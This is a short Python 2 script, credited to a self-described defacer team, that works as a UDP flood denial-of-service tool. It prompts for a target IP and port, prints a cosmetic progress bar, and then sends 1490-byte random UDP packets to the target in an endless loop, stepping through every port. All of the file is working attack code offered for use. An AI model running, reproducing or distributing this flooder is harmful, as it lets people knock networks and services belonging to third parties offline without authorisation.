#!/bin/python
#By Mr. Mpx7

import os
import sys
import time
import random
import socket
#codeFuck
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"  # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"   # White
R = "\033[31m"    # Red
C = "\033[36;1m"  # Cyan

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet 'FR13NDS' | lolcat")
os.system("date")
print "\033[90;1m_________________________________"
print "\033[90;1m| \033[34mAuthor: \033[36;1mMr. Mpx7"
print "\033[90;1m| \033[34mTeam  : \033[36;1mFR13NDS DEFACER TEAM"
print "\033[90;1m| \033[34mKontak: \033[36;1mdefacerfriends@gmail.com"
print "\033[90;1m| \033[34mGithub: \033[36;1mhttps://github.com/FriendsDefacerTeam"
print "\033[90;1m|________________________________"
print "        \033[36;1mPowered By \033[90;1mMr. Mpx7"
print
ip = raw_input("\033[31m[?] \033[90;1mIP Target : ")
port = input("\033[31m[?]\033[90;1mPort       : ")

os.system("figlet Attack")
print "[                    ] 0% "
time.sleep(3)
print "[.....               ] 25%"
time.sleep(2)
print "[..........          ] 50%"
time.sleep(1)
print "[...............     ] 75%"
time.sleep(3)
print "[....................] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
